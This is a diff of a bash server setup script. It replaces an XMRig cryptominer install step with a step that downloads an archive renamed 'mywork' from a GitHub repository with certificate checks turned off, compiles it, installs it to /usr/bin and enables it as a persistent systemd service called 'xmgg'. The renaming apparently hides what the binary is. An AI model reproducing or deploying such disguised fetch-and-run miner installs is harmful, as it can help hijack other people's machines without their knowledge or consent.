@@ -19,36 +19,32 @@ function Installation_dependency() {
     if [[ ${release} == "centos" ]]; then
       yum update
       yum install -y gzip wget
+      yum install hwloc nodejs -y
     else
       apt-get update
-      apt-get install -y gzip wget
+      apt-get install gzip wget -y
+      apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+      apt-get install hwloc nodejs -y
     fi
   fi
-  apt-get install hwloc nodejs -y
 }
 
-function Install_XMRIG(){
-  wget --no-check-certificate https://github.com/summaxx/myscript/raw/master/xmrig
-  chmod 755 xmrig
-  mv xmrig /usr/bin/xmrig
-  chmod -R 777 /usr/bin/xmrig
-  wget  --no-check-certificate https://github.com/summaxx/myscript/raw/master/xmgg.service
+function Install_work(){
+  wget --no-check-certificate https://github.com/summaxx/myscript/raw/refs/heads/master/mywork.gz
+  tar -xf mywork.gz
+  cd mywork
+  mkdir mywork/build && cd mywork/build
+  cmake ..
+  make -j$(nproc)
+  mv mywork /usr/bin/
+  chmod +x /usr/bin/mywork
+  wget --no-check-certificate https://github.com/summaxx/myscript/raw/refs/heads/master/xmgg.service
   chmod 755 xmgg.service
   mv xmgg.service /usr/lib/systemd/system
   systemctl enable xmgg && systemctl restart xmgg
 }
 
-function Install_autoreboot(){
-  wget --no-check-certificate https://github.com/summaxx/myscript/raw/master/r.sh
-  wget --no-check-certificate https://github.com/summaxx/myscript/raw/master/e.sh
-  chmod 755 r.sh
-  chmod 755 e.sh
-  mv r.sh /usr/bin/
-  mv e.sh /etc/profile.d/
-  /usr/bin/r.sh &
-}
-
 sleep 3s
 Installation_dependency
 Install_Gost
-Install_XMRIG
+Install_work
